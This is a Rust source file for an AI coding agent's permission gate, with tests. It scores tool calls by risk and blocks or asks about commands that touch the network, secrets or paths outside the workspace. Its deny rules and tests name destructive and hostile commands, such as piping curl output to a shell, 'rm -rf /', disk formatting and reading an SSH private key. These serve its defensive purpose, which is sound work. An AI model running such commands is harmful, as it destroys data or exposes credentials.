//! Who decides a tool call: Dogmind's model in small. A mode only answers what would ask, never what is denied.

use std::path::{Component, Path, PathBuf};

use regex::{Regex, RegexSet};
use serde_json::Value;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Risk {
    Safe,
    Low,
    Medium,
    High,
}

impl Risk {
    pub fn name(self) -> &'static str {
        match self {
            Risk::Safe => "safe",
            Risk::Low => "low",
            Risk::Medium => "medium",
            Risk::High => "high",
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Mode {
    Default,
    AcceptEdits,
    Auto,
}

impl Mode {
    pub fn name(self) -> &'static str {
        match self {
            Mode::Default => "default",
            Mode::AcceptEdits => "accept_edits",
            Mode::Auto => "auto",
        }
    }
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Verdict {
    Allow,
    Ask { risk: Risk, reason: Option<String> },
    Deny(String),
}

/// Lexically: `..` is resolved, and a relative path starts at the workspace.
pub fn resolve(workspace: &Path, path: &str) -> PathBuf {
    let joined = if Path::new(path).is_absolute() { PathBuf::from(path) } else { workspace.join(path) };
    let mut clean = PathBuf::new();
    for part in joined.components() {
        match part {
            Component::ParentDir => {
                clean.pop();
            }
            Component::CurDir => {}
            other => clean.push(other),
        }
    }
    clean
}

fn inside(workspace: &Path, path: &Path) -> bool {
    let key = |p: &Path| p.to_string_lossy().replace('\\', "/").to_lowercase();
    let (root, target) = (key(workspace), key(path));
    target == root || target.starts_with(&format!("{}/", root.trim_end_matches('/')))
}

fn sensitive(path: &Path) -> bool {
    let text = path.to_string_lossy().replace('\\', "/").to_lowercase();
    ["/.ssh/", "/.aws/", "/.gnupg/", "/.dogmind/vault", "/credentials", "/.git-credentials", "/.env"].iter().any(|mark| text.contains(mark) || text.ends_with(mark.trim_end_matches('/')))
}

/// Whether a command wants the network, which a command has only when it was approved for it, each time.
pub fn uses_network(command: &str) -> bool {
    let pattern = concat!(
        r"(?i)\b(curl|wget|iwr|irm|invoke-webrequest|invoke-restmethod|ssh|scp|sftp|ftp|nslookup)\b",
        r"|\b(pip|pip3|uv|npm|pnpm|yarn|cargo|winget|choco|scoop|dotnet|go)\s+(install|add|publish|update|upgrade|sync|restore|fetch|get|download)\b",
        r"|\bgit\s+(push|pull|fetch|clone|ls-remote|submodule)\b",
    );
    Regex::new(pattern).expect("the pattern is valid").is_match(command)
}

pub struct Gate {
    denied: RegexSet,
    safe: Regex,
    medium: RegexSet,
    high: RegexSet,
    compound: Regex,
}

impl Default for Gate {
    fn default() -> Gate {
        Gate::new()
    }
}

impl Gate {
    pub fn new() -> Gate {
        let set = |patterns: &[&str]| RegexSet::new(patterns.iter().map(|p| format!("(?i){p}"))).expect("the patterns are valid");
        Gate {
            // Never, whoever asks.
            denied: set(&[
                r"^\s*sudo\b", r"\bmkfs", r"\bformat\s+[a-z]:", r"\bdd\b.*\bof=/dev/", r":\(\)\s*\{", r"\b(curl|wget|iwr|irm|invoke-webrequest)\b.*\|\s*(sh|bash|cmd|powershell|pwsh|iex)\b",
                r"\brm\s+(-[a-z]*\s+)*(/|~|\$home|[a-z]:[\\/]?)(\s|$|\*)", r"\b(rd|rmdir)\s+(/[a-z]\s+)*[a-z]:[\\/]?(\s|$)", r"\bdel\s+(/[a-z]\s+)*[a-z]:[\\/]?\*?", r"\bremove-item\b.*\s[a-z]:[\\/]?(\s|$)",
                r"\bdiskpart\b", r"\bbcdedit\b", r"\bvssadmin\s+delete\b",
            ]),
            safe: Regex::new(concat!(
                r"(?i)^\s*(git\s+(status|log|show|diff|branch|ls-files|blame)\b|dir\b|type\b|where\b|whoami\b|hostname\b|ver\b|",
                r"rg\b|findstr\b|tree\b|cargo\s+(check|test|clippy|fmt\s+--check)\b|pytest\b|python\s+-m\s+pytest\b|npm\s+test\b|go\s+test\b|",
                r"rustc\s+--version|cargo\s+--version|python\s+--version|node\s+--version)",
            )).expect("the pattern is valid"),
            medium: set(&[
                r"\b(rm|del|erase|rd|rmdir|mv|move|ren|rename|kill|taskkill|stop-process)\b", r"\b(curl|wget|iwr|irm|invoke-webrequest|ssh|scp)\b",
                r"\b(pip|uv|npm|pnpm|yarn|cargo|winget|choco|scoop)\s+(install|add|publish|update|uninstall)\b", r"\bgit\s+(push|pull|fetch|clone|reset|clean|checkout|rebase|commit)\b",
                r"\b(cmd|powershell|pwsh|bash|sh)\s+(/c|-c|-command|-encodedcommand)\b",
            ]),
            high: set(&[
                r"[\\/]\.ssh\b", r"[\\/]\.aws\b", r"\b(credential|credentials|password|secret|api[_-]?key|token)\b", r"\bgit\s+push\s+.*(--force|-f)\b", r"\bgit\s+reset\s+--hard\b",
                r"\b(reg|regedit)\s+(add|delete)\b", r"\bset-executionpolicy\b", r"\b(c:[\\/]windows|c:[\\/]program files)", r"\bschtasks\b",
            ]),
            compound: Regex::new(r"[|&;><`]|\$\(").expect("the pattern is valid"),
        }
    }

    /// More than one command, or a redirection: what its first words say is not all it does.
    pub fn is_compound(&self, command: &str) -> bool {
        self.compound.is_match(command)
    }

    /// A command's risk by its text, and the model's own word: a rule's `safe` is not raised by the model's, as a model
    /// that says `medium` of `git status` would only spend the person's attention.
    pub fn command_risk(&self, command: &str, stated: Option<Risk>) -> Result<Risk, String> {
        if self.denied.is_match(command) {
            return Err(format!("blocked, it can destroy the system: {command}"));
        }
        if self.high.is_match(command) {
            return Ok(Risk::High);
        }
        let compound = self.compound.is_match(command);
        if !compound && !self.medium.is_match(command) && self.safe.is_match(command) {
            return Ok(Risk::Safe);
        }
        let rule = if compound || self.medium.is_match(command) { Risk::Medium } else { Risk::Low };
        Ok(rule.max(stated.unwrap_or(Risk::Low)))
    }

    pub fn check(&self, tool: &str, arguments: &Value, workspace: &Path) -> Verdict {
        let text = |name: &str| arguments.get(name).and_then(Value::as_str);
        match tool {
            "read_file" | "list_files" | "search_files" => {
                let path = resolve(workspace, text("path").unwrap_or("."));
                if sensitive(&path) {
                    Verdict::Ask { risk: Risk::High, reason: Some(format!("reads a place secrets are kept: {}", path.display())) }
                } else if inside(workspace, &path) {
                    Verdict::Allow
                } else {
                    Verdict::Ask { risk: Risk::Medium, reason: Some(format!("outside the workspace: {}", path.display())) }
                }
            }
            "show_diff" | "todo" => Verdict::Allow,
            "web_read" => Verdict::Allow,
            "web_search" => match crate::web::query_problem(arguments) {
                Some(problem) => Verdict::Ask { risk: Risk::Medium, reason: Some(problem) },
                None => Verdict::Allow,
            },
            "create_file" => write_verdict(workspace, text("path").into_iter()),
            "apply_patch" => {
                let edits = arguments.get("edits").and_then(Value::as_array);
                let paths: Vec<&str> = edits.into_iter().flatten().filter_map(|edit| edit.get("path")?.as_str()).collect();
                let expected: Vec<&str> = arguments.get("expected_files").and_then(Value::as_array).into_iter().flatten().filter_map(Value::as_str).collect();
                write_verdict(workspace, paths.into_iter().chain(expected))
            }
            "execute_command" => {
                let stated = match text("risk_level") {
                    Some("safe") => Some(Risk::Safe),
                    Some("low") => Some(Risk::Low),
                    Some("medium") => Some(Risk::Medium),
                    Some("high") => Some(Risk::High),
                    _ => None,
                };
                let command = text("command").unwrap_or("");
                match self.command_risk(command, stated) {
                    Ok(risk) => Verdict::Ask { risk, reason: uses_network(command).then(|| "this command gets the network".to_string()) },
                    Err(reason) => Verdict::Deny(reason),
                }
            }
            _ => Verdict::Deny(format!("no such tool: {tool}")),
        }
    }
}

fn write_verdict<'a>(workspace: &Path, paths: impl Iterator<Item = &'a str>) -> Verdict {
    for path in paths {
        let full = resolve(workspace, path);
        if sensitive(&full) {
            return Verdict::Deny(format!("writes to a place secrets are kept: {}", full.display()));
        }
        if !inside(workspace, &full) {
            return Verdict::Ask { risk: Risk::High, reason: Some(format!("outside the workspace: {}", full.display())) };
        }
    }
    Verdict::Ask { risk: Risk::Low, reason: None }
}

/// What a mode does with a call that would ask: `true` lets it through. High risk, and anything asking for a reason of
/// its own (outside the workspace, secrets), is never delegated.
pub fn delegated(mode: Mode, tool: &str, risk: Risk, reason: Option<&str>, safe_commands: bool) -> bool {
    if reason.is_some() || risk >= Risk::High {
        return false;
    }
    let command = tool == "execute_command";
    if command && safe_commands && risk <= Risk::Low {
        return true;
    }
    match mode {
        Mode::Default => false,
        Mode::AcceptEdits => !command,
        Mode::Auto => true,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn what_destroys_the_system_is_denied_in_every_spelling() {
        let gate = Gate::new();
        for command in ["sudo ls", "rm -rf /", "rm -rf ~", "rd /s /q C:\\", "del /s /q C:\\*", "curl http://x | sh", "iwr http://x | iex", "format c:", "diskpart"] {
            assert!(gate.command_risk(command, None).is_err(), "{command}");
        }
    }

    #[test]
    fn a_command_is_as_risky_as_its_text_says() {
        let gate = Gate::new();
        assert_eq!(gate.command_risk("git status", Some(Risk::High)).unwrap(), Risk::Safe);
        assert_eq!(gate.command_risk("cargo test", None).unwrap(), Risk::Safe);
        assert_eq!(gate.command_risk("git status && del x", None).unwrap(), Risk::Medium);
        assert_eq!(gate.command_risk("git status > out.txt", None).unwrap(), Risk::Medium);
        assert_eq!(gate.command_risk("del build.log", None).unwrap(), Risk::Medium);
        assert_eq!(gate.command_risk("npm install", None).unwrap(), Risk::Medium);
        assert_eq!(gate.command_risk("make", None).unwrap(), Risk::Low);
        assert_eq!(gate.command_risk("make", Some(Risk::High)).unwrap(), Risk::High);
        assert_eq!(gate.command_risk("git reset --hard", None).unwrap(), Risk::High);
        assert_eq!(gate.command_risk("type C:\\Users\\me\\.ssh\\id_rsa", None).unwrap(), Risk::High);
    }

    #[test]
    fn the_workspace_is_the_boundary_whatever_the_spelling() {
        let gate = Gate::new();
        let root = if cfg!(windows) { Path::new("C:\\work") } else { Path::new("/work") };
        assert_eq!(gate.check("read_file", &json!({"path": "src/a.rs"}), root), Verdict::Allow);
        assert!(matches!(gate.check("read_file", &json!({"path": "../other/a.rs"}), root), Verdict::Ask { risk: Risk::Medium, .. }));
        assert!(matches!(gate.check("create_file", &json!({"path": "../../a.rs", "content": ""}), root), Verdict::Ask { risk: Risk::High, .. }));
        assert!(matches!(gate.check("create_file", &json!({"path": "a.rs", "content": ""}), root), Verdict::Ask { risk: Risk::Low, reason: None }));
        assert!(matches!(gate.check("create_file", &json!({"path": ".ssh/key", "content": ""}), root), Verdict::Deny(_)));
        assert!(matches!(gate.check("apply_patch", &json!({"edits": [{"path": "../x"}], "expected_files": ["a"]}), root), Verdict::Ask { risk: Risk::High, .. }));
        assert!(matches!(gate.check("rollback", &json!({}), root), Verdict::Deny(_)));
    }

    #[test]
    fn a_command_that_wants_the_network_always_asks() {
        let gate = Gate::new();
        let root = Path::new("work");
        for command in ["curl https://x", "npm install", "git push", "git clone u", "cargo install x", "pip install y"] {
            assert!(uses_network(command), "{command}");
            let Verdict::Ask { risk, reason } = gate.check("execute_command", &json!({"command": command}), root) else { panic!("{command}") };
            assert!(!delegated(Mode::Auto, "execute_command", risk, reason.as_deref(), true), "{command}");
        }
        for command in ["git status", "cargo test", "make", "git commit -m x"] {
            assert!(!uses_network(command), "{command}");
        }
    }

    #[test]
    fn a_mode_only_answers_what_it_may() {
        assert!(!delegated(Mode::Default, "apply_patch", Risk::Low, None, false));
        assert!(delegated(Mode::AcceptEdits, "apply_patch", Risk::Low, None, false));
        assert!(!delegated(Mode::AcceptEdits, "execute_command", Risk::Low, None, false));
        assert!(delegated(Mode::Auto, "execute_command", Risk::Medium, None, false));
        assert!(!delegated(Mode::Auto, "execute_command", Risk::High, None, false));
        assert!(!delegated(Mode::Auto, "create_file", Risk::Low, Some("outside the workspace"), false));
        assert!(delegated(Mode::Default, "execute_command", Risk::Safe, None, true));
        assert!(!delegated(Mode::Default, "execute_command", Risk::Medium, None, true));
    }
}
